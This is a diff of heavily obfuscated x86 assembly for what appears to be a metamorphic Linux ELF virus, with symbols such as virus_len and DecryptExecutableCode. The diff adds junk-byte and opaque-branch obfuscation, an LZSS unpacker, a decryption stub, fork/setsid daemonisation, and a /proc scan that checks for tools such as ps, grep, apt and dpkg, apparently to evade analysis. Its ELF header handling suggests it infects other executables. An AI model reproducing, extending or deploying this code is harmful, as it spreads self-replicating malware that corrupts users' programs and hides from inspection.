+    cmp         BYTE [r1 + rax], 0x0
+    jz          ..@snFNG3x2MNBs
+    add         rax, 1
+    jmp         ..@yoDURKMmHX6s
+..@ugQ041YSStf7:
+    jmp         ..@9FqE0GdV8UAO
     jmp         $+3
-db 0x83
-    jb          ..@i7vo3WcvoO3Y
-    jae         ..@i7vo3WcvoO3Y
-..@3VKfgjoba2Nb:
+db 0x2d
+    jmp         $+5
+db 0x51, 0x39, 0xc9
+    jmp         ..@LHwyxpMeR7Zx
+..@ertdKkVTCL71:
+    inc         DWORD [rsp+_LZSSD_OFF.index]
+    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
+    jmp         $+3
+db 0x26
+    jmp         $+3
+db 0x97
+    jmp         ..@EcyoeV2LaVTo
+..@7xZ6mvbr8IPl:
+    jnz         ..@jEWlco211Kmc
+    xor         rax, rax
+    jb          ..@v4YYpXSQGUCq
+    jae         ..@v4YYpXSQGUCq
+..@7FFDGcmAZYFH:
+    test        eax, eax
+    jz          ..@BchobFBkiwIY
+    jmp         $+5
+db 0x29, 0xbe, 0x60
+    jb          ..@FTXf60hqImBg
+    jae         ..@FTXf60hqImBg
+..@9VlYsiqxTOcC:
+    xor         r4, r4
+    jmp         $+5
+db 0x03, 0x72, 0xe7
+    jmp         ..@g3BgTJ1FoCPU
+..@Iiz8PPSqNCn4:
+    DESTROY_MX_VAR
+    mov         rax, r1
+    jmp         $+4
+db 0x71, 0x8a
+    jmp         ..@YhnMjAvOPPxK
+..@cTp4sQj6TQlh:
     mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
-    je          ..@KUy03Jf4pziV
-    jne         ..@KUy03Jf4pziV
-..@zJHLCZY9LZxK:
-    mov         r1, QWORD [rsp]
+    jmp         ..@CCwhRtr2Mg6C
+..@YhnMjAvOPPxK:
+    xor         r1, r1
+    jb          ..@5lXhlKT10Q7N
+    jae         ..@5lXhlKT10Q7N
+..@eSn0YOr0ADzH:
+    xor         rax, rax
+    jmp         $+4
+db 0x26, 0x2b
+    jmp         ..@4dcfBbrp1cpX
+..@27DsDKXoqq3X:
+    call        ExitProgram
+    jl          LzssDecoder
+    jge         LzssDecoder
+..@oSiDRTpE5dg7:
+    add         rdi, bytes
+    cmp         QWORD [rdi], 0x00
+    jmp         $+5
+db 0x76, 0x07, 0xc3
+    jl          ..@391RZ9YOZGZy
+    jge         ..@391RZ9YOZGZy
+..@DUVWxKr2OhbZ:
+    xor         rax, rax
+    jmp         ..@y9vyCqT3RDU9
+..@BUY3X6OvIHWf:
+    mov         r4, m4
+    je          ..@pAAacqsJTbFb
+    jne         ..@pAAacqsJTbFb
+..@0RR24FZ0r59f:
+    syscall
+    jb          ..@bYJFgfbCLRJF
+    jae         ..@bYJFgfbCLRJF
+..@Wnj8i95tyGAp:
+    mov         rbx, rsi
+    jmp         $+4
+db 0x67, 0x00
+    jmp         $+5
+db 0x02, 0xa8, 0x33
+    jmp         $+3
+db 0x63
+    jmp         $+3
+db 0x24
+    jb          ..@fnbJyD1SyiZe
+    jae         ..@fnbJyD1SyiZe
+..@jEWlco211Kmc:
+    mov         al, BYTE [r1]
+    jmp         $+4
+db 0x27, 0x2c
+    js          ..@q3CMWGvDVPx7
+    jns         ..@q3CMWGvDVPx7
+..@4dcfBbrp1cpX:
+    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
+    jmp         $+3
+db 0x2c
+    je          ..@yeY9qVQdgAOM
+    jne         ..@yeY9qVQdgAOM
+..@rAlTbOlMW1tV:
+    push        rdi
+    jmp         ..@BnPNeYaVgLyI
+..@fr7wR2rprE9Q:
+    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
+    mov         BYTE [rbx], al
+    jb          ..@CB36n3iMEuzJ
+    jae         ..@CB36n3iMEuzJ
+..@4L3Mca2PiAyK:
     mov         r2, QWORD [r4]
     test        r2, r2
-    jb          ..@ip3HBhOByeW8
-    jae         ..@ip3HBhOByeW8
-..@kXOlX8HufZLh:
-    jnz         ..@dRIQR0vASyRx
-    jmp         $+4
-db 0x2c, 0xce
-    jl          ..@3VKfgjoba2Nb
-    jge         ..@3VKfgjoba2Nb
-..@axXo7L094pWV:
-    add         r1, 1
-    js          ..@4J9xp5uP2PB7
-    jns         ..@4J9xp5uP2PB7
-..@fRL2m3pbGZdb:
+    je          ..@yqbSPr3g6n6q
+    jne         ..@yqbSPr3g6n6q
+..@XHoi713RCr9E:
+    jnz         ..@a2mwhNWfUPbe
+    js          ..@rAlTbOlMW1tV
+    jns         ..@rAlTbOlMW1tV
+..@Bz8BJsl8CuBG:
+    sub         al, BYTE [r2]
+    jl          ..@YIAD9xc0zoMV
+    jge         ..@YIAD9xc0zoMV
+..@74JTVCrqa8ea:
     mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
+    jl          ..@rBq5nIQsNkLq
+    jge         ..@rBq5nIQsNkLq
+..@vervCnxwLSrN:
+    jmp         ..@hheCiYhqg3pC
+    je          ..@76paBJYM05uU
+    jne         ..@76paBJYM05uU
+Strlen:
+    jmp         ..@mMRpexlbYf9s
+..@5IdyUPGYYIHC:
+    mov         r2d, DWORD [r5]
+    sub         r2, non_packed_len
+    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
+    jmp         ..@NJMAiHbHhyz7
+..@9r2V5CeTHEQt:
+    cmp         DWORD [r5], 0x00000000
     jmp         $+5
-db 0x36, 0xb2, 0xcb
-    jb          ..@6jgYotLUKeU4
-    jae         ..@6jgYotLUKeU4
-..@LLeSXag6RfDz:
-    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
+db 0x25, 0xfa, 0xec
+    jb          ..@fC1ZdFPMMaeG
+    jae         ..@fC1ZdFPMMaeG
+..@0Jc0zXdESeAV:
+    jmp         ..@pAAacqsJTbFb
     jmp         $+5
-db 0x9d, 0x71, 0x02
-    jb          ..@sw8zWvdpEFIk
-    jae         ..@sw8zWvdpEFIk
-..@7gpwY1Vskr9Z:
-%ifdef X86_64
-    xor         r9, r9
-    mov         esi, original_virus_len-non_packed_len
+db 0x53, 0xcd, 0xfd
+    jmp         $+5
+db 0xea, 0xfb, 0x78
+    je          ..@ePZRE3ctYUfo
+    jne         ..@ePZRE3ctYUfo
+..@oCsVAsbudayB:
+    call        rax
+    jl          ..@eSn0YOr0ADzH
+    jge         ..@eSn0YOr0ADzH
+..@nQBpl4tW88s4:
+%ifdef X86_32
     mov         edx, 111b
 %endif
-    jb          ..@K90Jiwe0HW5g
-    jae         ..@K90Jiwe0HW5g
-..@xGzbkzaMCbtf:
+    jmp         $+5
+db 0xe9, 0x8c, 0xd2
+    jmp         $+3
+db 0xfb
+    jb          ..@rFtMgqrnmnbs
+    jae         ..@rFtMgqrnmnbs
+..@8CdNR3E4FGer:
     xor         r1, r1
     call        ExitProgram
-    jb          ..@iSRRlhz1UBsL
-    jae         ..@iSRRlhz1UBsL
-..@6jgYotLUKeU4:
-    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
-    jmp         $+3
-db 0x9f
-    jmp         $+4
-db 0xf0, 0x9a
-    jmp         $+5
-db 0xe8, 0x4f, 0x37
-    jb          ..@gJdutEVoxeFM
-    jae         ..@gJdutEVoxeFM
-..@GnBqsbnjek6o:
+    jmp         ..@T1DnZp3ZngAk
+..@Xis7uspxTRcc:
+    mov         rax, SYS_MUNMAP
+    jb          ..@0RR24FZ0r59f
+    jae         ..@0RR24FZ0r59f
+..@zycdyJw78yaB:
+    GGLOBAL     _packed
+    mov         m8, r5 
     call        Processes
-    jmp         ..@xGzbkzaMCbtf
-..@3ThlNfTI3jgQ:
+    jmp         $+3
+db 0x56
+    jmp         $+4
+db 0x9a, 0xb9
+    js          ..@8CdNR3E4FGer
+    jns         ..@8CdNR3E4FGer
+..@rZAn2L9qp1Ci:
+    sub         rdi, 1
+    sub         rdi, 0x5
+    jb          ..@8AKGkOKZO1ne
+    jae         ..@8AKGkOKZO1ne
+..@SSGpHHxKQxjx:
     xor         r1, r1
     xor         r2, r2
     xor         r3, r3
+    jmp         ..@4HJdVqZADlvA
+..@CjXYWpjIY8x9:
+    jg          ..@PiVOeoxVxlYk
     jmp         $+3
-db 0xfb
-    jmp         $+5
-db 0x9f, 0xbc, 0xb9
-    js          ..@l3SbY9cWinRk
-    jns         ..@l3SbY9cWinRk
-..@OZKT2TCeeBR9:
-    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
-    jmp         $+3
-db 0x41
-    jmp         $+5
-db 0x64, 0x9d, 0xa5
-    jmp         ..@kXOlX8HufZLh
-..@QmitKaGXMLkn:
-    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
-    je          ..@rCm2NO9ZTgQ4
-    jne         ..@rCm2NO9ZTgQ4
-..@bXYVOiRXq5SK:
-%ifdef X86_32
-    mov         edi, 0xffffffff
-%endif
-    jmp         $+3
-db 0x58
+db 0x63
     jmp         $+3
 db 0x79
-    jmp         $+5
-db 0xb7, 0x6a, 0xdb
-    jb          ..@prphkvozpsBb
-    jae         ..@prphkvozpsBb
-..@l3SbY9cWinRk:
-    xor         r4, r4
+    jmp         ..@vervCnxwLSrN
+..@G4cinLbzXXey:
+    dec         QWORD [rsp+_LZSSD_OFF.length]
+    jb          ..@OV0i95vCuDhA
+    jae         ..@OV0i95vCuDhA
+..@6bYgXjuKjvrW:
+%ifdef X86_64
+    xor         r9, r9
+    mov         esi, original_virus_len-non_packed_len
+%endif
+    jb          ..@TGGfaNGh821m
+    jae         ..@TGGfaNGh821m
+..@BKpKKeixGG8O:
+    syscall
+    js          ..@1ZlGUmYQVjez
+    jns         ..@1ZlGUmYQVjez
+..@FuyouaQBd2tQ:
+    shl         eax, 1
+    jmp         $+3
+db 0x48
+    jmp         ..@u0ppDXxSPuEJ
+..@g3BgTJ1FoCPU:
     xor         r5, r5
-    jl          ..@1wE8MCdNfI90
-    jge         ..@1wE8MCdNfI90
+    jmp         rax
+    jmp         ..@BchobFBkiwIY
+..@NCtdPXdVnShJ:
+    push        r1
+    jmp         $+3
+db 0x11
+    jl          ..@gdly9i1BAVO1
+    jge         ..@gdly9i1BAVO1
+..@ebYBAlQNEx3K:
+    xor         r4, r4
+    js          ..@vkBEUMs9eHVD
+    jns         ..@vkBEUMs9eHVD
+..@inpU0Cy9pevQ:
+    mov         eax, SYS_SETSID
+    syscall
+    xor         rax, rax
+    jmp         $+4
+db 0x67, 0x4e
+    jmp         $+5
+db 0x87, 0x63, 0x2d
+    jb          ..@r7Aa1Q8eWchz
+    jae         ..@r7Aa1Q8eWchz
+..@a2mwhNWfUPbe:
+    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
+    js          ..@vDIkUTV2VFzC
+    jns         ..@vDIkUTV2VFzC
+..@k7BIwRMOd0gL:
+    GGLOBAL     virus_len
+    jmp         ..@9r2V5CeTHEQt
+..@NJMAiHbHhyz7:
+    call        LzssDecoder
+    jmp         $+4
+db 0x36, 0x6c
+    jmp         $+5
+db 0x59, 0x2d, 0x99
+    jmp         $+3
+db 0x5f
+    jmp         $+3
+db 0x52
+    jmp         $+3
+db 0x1d
+    jl          ..@knz6Y6UcO5aq
+    jge         ..@knz6Y6UcO5aq
+..@vX96MhINpTF2:
+    sub         rsp, _LZSSD_OFF_size
+    jmp         $+5
+db 0x5b, 0x97, 0x73
+    jl          ..@qrou1xWvUf1o
+    jge         ..@qrou1xWvUf1o
+..@T0kyhOwjq2Pa:
+    VAR         public, entrypoint
+    jl          ..@eGUbvioFc0mo
+    jge         ..@eGUbvioFc0mo
+..@n8IX09HtrNHO:
+    sub         rcx, 1
+    jmp         $+5
+db 0xbf, 0xff, 0xf9
+    jmp         $+5
+db 0x93, 0x9e, 0x01
+    je          ..@XHoi713RCr9E
+    jne         ..@XHoi713RCr9E
+..@BnPNeYaVgLyI:
+    ret
+    jmp         ..@hheCiYhqg3pC
+..@0HlROIOD44kS:
+    mov         rsi, rax 
+    jmp         $+3
+db 0x71
+    jmp         ..@B2lwm2lUp0eT
+..@al6PnG8tOQ78:
+    mov         rdi, rbp
+    jmp         $+3
+db 0x95
+    jl          ..@oSiDRTpE5dg7
+    jge         ..@oSiDRTpE5dg7
+DecryptExecutableCode:
+    jmp         ..@k7BIwRMOd0gL
+..@knz6Y6UcO5aq:
+    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
+    mov         m8, rax
+    jmp         $+4
+db 0x0c, 0xe3
+    jmp         ..@oCsVAsbudayB
+..@mMRpexlbYf9s:
+    xor         rax, rax
+    jl          ..@KwDMdNiNVTqc
+    jge         ..@KwDMdNiNVTqc
+..@B2lwm2lUp0eT:
+    mov         rcx, LENGTH_BITS
+    call        ..@76paBJYM05uU
+    add         rax, 1
+    js          ..@utS42NB1cuSz
+    jns         ..@utS42NB1cuSz
+..@q3CMWGvDVPx7:
+    cmp         BYTE [r2], al
+    je          ..@5Fiadffoclzw
+    jmp         $+5
+db 0xb7, 0x9a, 0xd2
+    jmp         $+5
+db 0x1d, 0x18, 0x4c
+    jmp         ..@Bz8BJsl8CuBG
+..@aSOiQmptMl9O:
+    GGLOBAL     virus_len
+    xor         r2, r2
+    jmp         $+3
+db 0xb8
+    jmp         ..@5IdyUPGYYIHC
+..@JzTS1UCroSOu:
+%ifdef X86_64
+    syscall
+%endif
+    js          ..@Db4YMuOpfY0K
+    jns         ..@Db4YMuOpfY0K
+..@eGUbvioFc0mo:
+    sub         r1, QWORD [r5]
+    jb          ..@Iiz8PPSqNCn4
+    jae         ..@Iiz8PPSqNCn4
+..@9FqE0GdV8UAO:
+    mov         rcx, 1
+    call        ..@76paBJYM05uU
+    jmp         ..@olRhbnjk2Yw2
+..@5lXhlKT10Q7N:
+    xor         r2, r2
+    js          ..@nXDAhyFDf0aP
+    jns         ..@nXDAhyFDf0aP
+..@y9vyCqT3RDU9:
+    xor         rdx, rdx
+    jmp         ..@v2nHSMngqGAl
+..@OpPLbx4due0d:
+    mov         rcx, 8
+    call        ..@76paBJYM05uU
+    xor         rdi, rdi
+    jl          ..@fr7wR2rprE9Q
+    jge         ..@fr7wR2rprE9Q
+..@vkBEUMs9eHVD:
+    mov         rax, SYS_WAIT4
+    jmp         $+3
+db 0x5f
+    jl          ..@BKpKKeixGG8O
+    jge         ..@BKpKKeixGG8O
+..@rFtMgqrnmnbs:
+%ifdef X86_32
+    mov         esi, 0x22
+%endif
+    js          ..@xbxMRoiDDr2y
+    jns         ..@xbxMRoiDDr2y
+..@8dnFZxvIEbSN:
+    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
+    jmp         $+3
+db 0x9b
+    jmp         $+5
+db 0xd3, 0xa9, 0x7f
+    jmp         $+3
+db 0x7b
+    jl          ..@74JTVCrqa8ea
+    jge         ..@74JTVCrqa8ea
+..@JXk69gW0leam:
+    test        eax, eax
+    jz          ..@50gqcEaftzC8
+    jl          ..@2hQZH8Wu3bgP
+    jge         ..@2hQZH8Wu3bgP
+..@mI4KOw9kiGXS:
+    syscall
+    cmp         eax, 0x0
+    jl          ..@FTXf60hqImBg
+    jmp         ..@7FFDGcmAZYFH
+..@EzTh4GIh8ObX:
+    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
+    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
+    jmp         $+5
+db 0xce, 0x28, 0x39
+    jmp         $+4
+db 0xc8, 0x4b
+    jmp         ..@OQLDfUerdfvQ
+..@RCdKhBBjMD9B:
+    ret
+    je          DecryptExecutableCode
+    jne         DecryptExecutableCode
+..@4HJdVqZADlvA:
+    xor         r4, r4
+    GGLOBAL     entrypoint
+    js          ..@cnPDc7r2a7sp
+    jns         ..@cnPDc7r2a7sp
+..@bYJFgfbCLRJF:
+    sub         rsp, _UEC_OFF_size
+    jmp         $+3
+db 0xfe
+    jb          ..@27DsDKXoqq3X
+    jae         ..@27DsDKXoqq3X
+..@nXDAhyFDf0aP:
+    xor         r3, r3
+    jb          ..@9VlYsiqxTOcC
+    jae         ..@9VlYsiqxTOcC
+LzssDecoder:
+    jmp         ..@vX96MhINpTF2
+..@VuthG0gSaeGF:
+    cmp         cl, dl
+    js          ..@9Jahm1UJvrN2
+    jns         ..@9Jahm1UJvrN2
+..@RFKlaWbZHhV3:
+    push        r1
+    push        r2
+    push        r3
+    jmp         $+5
+db 0x77, 0xb9, 0x85
+    jmp         ..@s3nrmzInVS6Z
+..@utS42NB1cuSz:
+    mov         rdx, rax
+    jl          ..@DpAHtui2wTwh
+    jge         ..@DpAHtui2wTwh
+..@gdly9i1BAVO1:
+    call        Strlen
+    mov         r3, rax
+    jmp         $+4
+db 0xbc, 0x69
+    jmp         $+4
+db 0xca, 0x8a
+    jmp         $+4
+db 0xc5, 0x07
+    jmp         $+3
+db 0x33
+    jmp         $+5
+db 0x6f, 0xf7, 0x08
+    jmp         $+3
+db 0x7b
+    jl          ..@BUY3X6OvIHWf
+    jge         ..@BUY3X6OvIHWf
+..@Mn7mkqko83Pb:
+    xor         rax, rax
+    mov         rax, SYS_FORK
+    jmp         $+3
+db 0xe5
+    jmp         ..@mI4KOw9kiGXS
+..@fnbJyD1SyiZe:
+    add         bx, cx
+    and         bx, WINDOW_LENGTH-1
+    jmp         ..@reXosgbzWP2q
+..@mZXu2fHUV5Vx:
+    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
+    jmp         $+5
+db 0x13, 0xdd, 0xa5
+    jmp         $+4
+db 0x87, 0x66
+    jmp         $+3
+db 0xd3
+    jl          ..@CjXYWpjIY8x9
+    jge         ..@CjXYWpjIY8x9
+..@3U8gkervwhEF:
+    VAR         public, _start
+    jmp         $+3
+db 0x1a
+    jb          ..@JwCZCIxDrhRK
+    jae         ..@JwCZCIxDrhRK
+..@i6kO4YA12IVy:
+    mov         rax, SYS_EXIT
+    jb          ..@wduaMhpK2gAO
+    jae         ..@wduaMhpK2gAO
+..@r7Aa1Q8eWchz:
+    mov         rax, SYS_FORK
+    jmp         $+3
+db 0x6e
+    js          ..@fx7mOsK4d7Yb
+    jns         ..@fx7mOsK4d7Yb
+..@s3nrmzInVS6Z:
+    xor         rax, rax
+    js          ..@jEWlco211Kmc
+    jns         ..@jEWlco211Kmc
+..@olRhbnjk2Yw2:
+    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
+    jmp         $+4
+db 0xa4, 0x2c
+    jb          ..@mZXu2fHUV5Vx
+    jae         ..@mZXu2fHUV5Vx
+..@wBeUJI5gW0aS:
+    jmp         ..@9FqE0GdV8UAO
+    js          ..@PiVOeoxVxlYk
+    jns         ..@PiVOeoxVxlYk
+Strncmp:
+    jmp         ..@RFKlaWbZHhV3
+..@uk6OXB2SBpFN:
+    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
+    jmp         ..@n8IX09HtrNHO
+..@h5T7G3SbaIup:
+    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
+    jmp         $+3
+db 0x02
+    jmp         $+5
+db 0x42, 0x98, 0x51
+    jl          ..@ertdKkVTCL71
+    jge         ..@ertdKkVTCL71
+..@694jf51CnRuR:
+    mov         r1, r5
+    jmp         $+4
+db 0x45, 0x21
+    jmp         $+4
+db 0x63, 0x9f
+    jmp         $+5
+db 0x33, 0x80, 0x63
+    jmp         $+4
+db 0xfa, 0x16
+    jl          ..@aSOiQmptMl9O
+    jge         ..@aSOiQmptMl9O
+..@hMCkxqsFdrke:
+    mov         m4, rdi
+    jmp         $+4
+db 0xcd, 0x55
+    jmp         ..@SSGpHHxKQxjx
+..@jdkvWkCkjgPl:
+    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
+    jmp         $+4
+db 0x07, 0xdc
+    jmp         ..@ugQ041YSStf7
+ExitProgram:
+    jmp         ..@yNtrM3yRl1Z1
+..@DpAHtui2wTwh:
+    xor         rax, rax
+    jmp         $+5
+db 0x85, 0x0b, 0xfc
+    js          ..@Tf9IfolXfBci
+    jns         ..@Tf9IfolXfBci
+..@OQLDfUerdfvQ:
+    inc         DWORD [rsp+_LZSSD_OFF.index]
+    jmp         $+5
+db 0xab, 0x09, 0x59
+    jb          ..@jdkvWkCkjgPl
+    jae         ..@jdkvWkCkjgPl
+..@wduaMhpK2gAO:
+    syscall
+    jmp         $+3
+db 0xdf
+    jmp         Strlen
+..@penR4g8tDHeF:
+    mov         vsp, rdi
+    jmp         $+3
+db 0x10
+    jmp         $+5
+db 0x60, 0x4f, 0xbb
+    jmp         ..@al6PnG8tOQ78
+..@pAAacqsJTbFb:
+    mov         r1, QWORD [rsp]
+    jmp         $+3
+db 0x1c
+    jl          ..@4L3Mca2PiAyK
+    jge         ..@4L3Mca2PiAyK
+..@cnPDc7r2a7sp:
+    cmp         QWORD [r5], 0x0000000000000000
+    je          ..@50gqcEaftzC8
+    jmp         $+4
+db 0xae, 0x03
+    js          ..@Mn7mkqko83Pb
+    jns         ..@Mn7mkqko83Pb
+..@tvV11N5qayCG:
+%ifdef X86_32
+    xor         ebp, ebp
+    mov         eax, SYS_MMAP2
+%endif
+    jmp         $+3
+db 0xca
+    jl          ..@o21ZpaPkBK7b
+    jge         ..@o21ZpaPkBK7b
+..@xbxMRoiDDr2y:
+%ifdef X86_32
+    mov         edi, 0xffffffff
+    push        ebp
+%endif
+    jmp         ..@tvV11N5qayCG
+..@yeY9qVQdgAOM:
+    mov         r2, original_virus_len-non_packed_len
+    jmp         $+5
+db 0xdf, 0xab, 0x77
+    js          ..@Xis7uspxTRcc
+    jns         ..@Xis7uspxTRcc
+..@fVslIyb9VKg1:
+    add         r4, bytes
+    jmp         $+4
+db 0x35, 0x9e
+    jmp         $+4
+db 0x6d, 0x04
+    jb          ..@0Jc0zXdESeAV
+    jae         ..@0Jc0zXdESeAV
+..@8AKGkOKZO1ne:
+    INIT_MX_VAR
+    jmp         ..@penR4g8tDHeF
+..@76paBJYM05uU:
+    pop         rdi
+    js          ..@DUVWxKr2OhbZ
+    jns         ..@DUVWxKr2OhbZ
+..@JwCZCIxDrhRK:
+    mov         r1, r5
+    jmp         $+3
+db 0x04
+    js          ..@T0kyhOwjq2Pa
+    jns         ..@T0kyhOwjq2Pa
+..@50gqcEaftzC8:
+    jmp         DecryptExecutableCode
+    jmp         $+4
+db 0xa8, 0xf8
+    js          ExitProgram
+    jns         ExitProgram
+..@rBq5nIQsNkLq:
+    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
+    mov         rax, 0x20
+    rep         stosb
+    jl          ..@wBeUJI5gW0aS
+    jge         ..@wBeUJI5gW0aS
+..@XiQkgBXx80P9:
+    GGLOBAL     _packed
+    js          ..@694jf51CnRuR
+    jns         ..@694jf51CnRuR
+..@yoDURKMmHX6s:
+    jmp         ..@KwDMdNiNVTqc
+    jb          ..@snFNG3x2MNBs
+    jae         ..@snFNG3x2MNBs
+..@MZpJFOx61Vst:
+    xor         rdi, rdi
+    jmp         ..@9SqfrsVzc4WE
+..@fC1ZdFPMMaeG:
+    jne         ..@T1DnZp3ZngAk
+    jmp         ..@zycdyJw78yaB
+..@vDIkUTV2VFzC:
+    jnz         ..@FuyouaQBd2tQ
+    jmp         $+5
+db 0x87, 0xb5, 0xac
+    jmp         $+3
+db 0x42
+    jb          ..@cTp4sQj6TQlh
+    jae         ..@cTp4sQj6TQlh
+..@9noMeqIVjlWi:
+%ifdef X86_32
+    pop         ebp
+%endif
+    jmp         $+4
+db 0x95, 0x03
+    jb          ..@6bYgXjuKjvrW
+    jae         ..@6bYgXjuKjvrW
+..@u0ppDXxSPuEJ:
+    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
+    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
+    test        dl, dl
+    jmp         ..@UcS7fJW0mstk
+..@reXosgbzWP2q:
+    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
+    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
+    mov         BYTE [rbx], al
+    jmp         ..@8kaXbdaHQBaN
+..@6GrEYEyRIWz5:
+    ret
+    jmp         $+5
+db 0xbd, 0x0c, 0x0b
+    jmp         GetEnv
+..@yNtrM3yRl1Z1:
+    DESTROY_MX_VAR
+    jmp         ..@i6kO4YA12IVy
+GetEnv:
+    jmp         ..@NCtdPXdVnShJ
+..@Db4YMuOpfY0K:
+    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
+    js          ..@XiQkgBXx80P9
+    jns         ..@XiQkgBXx80P9
+..@lJiA9XcyMQsO:
+    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
+    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
+    jmp         ..@NOJp2IcNXlVG
+..@tZlWWhfa2gvd:
+    test        rax, rax
+    jmp         $+3
+db 0x4b
+    jb          ..@Gx2w50H4oqUB
+    jae         ..@Gx2w50H4oqUB
+..@r0gDIqr9cRvj:
+    pop         rdi
+    js          ..@rZAn2L9qp1Ci
+    jns         ..@rZAn2L9qp1Ci
+..@YIAD9xc0zoMV:
+    jmp         ..@v4YYpXSQGUCq
+    jb          ..@5Fiadffoclzw
+    jae         ..@5Fiadffoclzw
+..@yqbSPr3g6n6q:
+    jz          ..@ePZRE3ctYUfo
+    call        Strncmp
+    jmp         $+5
+db 0xe1, 0xc1, 0x49
+    jmp         $+3
+db 0x8c
+    je          ..@tZlWWhfa2gvd
+    jne         ..@tZlWWhfa2gvd
+..@FTXf60hqImBg:
+    mov         r1, rax
+    xor         r2, r2
+    xor         r3, r3
+    jmp         $+3
+db 0x5f
+    jmp         $+5
+db 0xdb, 0x6d, 0xe0
+    jmp         $+5
+db 0xeb, 0x0a, 0x65
+    jmp         $+4
+db 0xa6, 0xc5
+    jmp         ..@ebYBAlQNEx3K
+..@v2nHSMngqGAl:
+    xor         rbx, rbx
+    jmp         ..@a2mwhNWfUPbe
+..@Tf9IfolXfBci:
+    xor         rcx, rcx
+    xor         rdi, rdi
+    jmp         ..@Wnj8i95tyGAp
 
 ;-----------------------------------------------------
 ; PACKED & ENCRYPTED PART (This part of the code is 
@@ -958,7 +1067,10 @@ VARIABLES packed
 procdir:    db "/proc/", 0
 status:     db "/status", 0
 
-procs: 
+procs:
+proc6:      db "dpkg", 0
+proc5:      db "apt", 0
+proc4:      db "ps", 0
 proc3:      db "grep", 0
 proc2:      db "cat", 0
 proc1:      db "vim", 0
@@ -981,3339 +1093,3399 @@ db 0x00
 ; Packed & Encrypted code.
 ;-----------------------------------------------------
 Processes:
-    jmp         ..@vs2p6tc4FMs5
-..@QfYQX6WrtWqK:
-    add         rsi, QWORD [rdi+s_h.sh_offset]
-    jmp         ..@ttOAdsWh1y1x
-..@LJqM4o0imLtz:
-    xor         r4, r4
-    jmp         ..@gQvvxN7q3uVp
-..@ZauhbCjyYQdl:
-    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
-    jmp         ..@OaQhCKndHfvF
-..@6u57JzVvJWLE:
-    call        MapFile
-    cmp         rax, 0
-    jmp         $+5
-db 0x7f, 0xa9, 0xcd
-    jl          ..@02ONdobWIwKZ
-    jge         ..@02ONdobWIwKZ
-..@cwFp3z8AfOk8:
-    jmp         ..@EiQxSn9l5KFR
-    jmp         $+5
-db 0x0d, 0x71, 0x34
-    jmp         ..@EiQxSn9l5KFR
-..@eNZAwRuqqkgy:
-    mov         rax, SYS_FORK
-    syscall
-    jb          ..@lywvGzYgsaJ5
-    jae         ..@lywvGzYgsaJ5
-..@POieD0xhJdu5:
-    xor         rax, rax
-    xor         rdx, rdx
-    js          ..@ZauhbCjyYQdl
-    jns         ..@ZauhbCjyYQdl
-..@84jEznymDDGp:
-    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
-    mov         ax, WORD [r5+linux_dirent.d_reclen]
+    jmp         ..@kKsgl6LDvq91
+..@rgefjWnk60U2:
+    add         r1, 1
+    jmp         ..@VaG5oao5Ygbw
+..@8Zi0pp2FyfWv:
+    lea         r1, [rsp+_PROC_OFF.buffer]
+    mov         r2, [rsp+_PROC_OFF.dirname]
+    jl          ..@o6eAyaB49r4z
+    jge         ..@o6eAyaB49r4z
+..@65Fxm98FmkTy:
     add         r5, rax
-    js          ..@VtZFTVR86yx7
-    jns         ..@VtZFTVR86yx7
-..@wnMcuPy5FUgy:
-    xor         rax, rax
+    js          ..@rvjagSC3Mr95
+    jns         ..@rvjagSC3Mr95
+..@Y3sATuHXbRQx:
+    xor         r1, r1
+    call_vsp    ExitProgram
     jmp         $+4
-db 0xfa, 0x2f
-    jmp         ..@e1mBqM7l1j93
-..@saSBHSM8RlE5:
-    jz          ..@0gciQTYG20PJ
-    movzx       rax, BYTE [r2]
-    mov         [r1], rax
+db 0x27, 0xa6
+    jmp         ..@RzdPHosprkxK
+..@NwxvB1837AfX:
+    mov         r2, QWORD [r1+file.filename]
+    mov         r4, r5
+    and         r4, 10b
     jmp         $+5
-db 0x5b, 0x41, 0x22
-    jmp         ..@wZ3gNGSXS9mq
-..@YJPKcIJIgDDd:
-    movzx       r3, WORD [r1+e_h.e_phentsize]
+db 0xb6, 0x35, 0x11
     jmp         $+5
-db 0x50, 0xed, 0xa9
-    jb          ..@aISdAxRTjYiM
-    jae         ..@aISdAxRTjYiM
-..@qGAOaolWu1d0:
+db 0xaa, 0x25, 0x93
+    jb          ..@VokoT8rXSPuX
+    jae         ..@VokoT8rXSPuX
+..@lfRBZa3XcGLF:
+    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
+    add         r5, QWORD [r4+rax+p_h.p_memsz]
+    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
+    jmp         $+4
+db 0x65, 0x06
+    js          ..@QeGQiCbTGazN
+    jns         ..@QeGQiCbTGazN
+..@uswTHaCXDIQL:
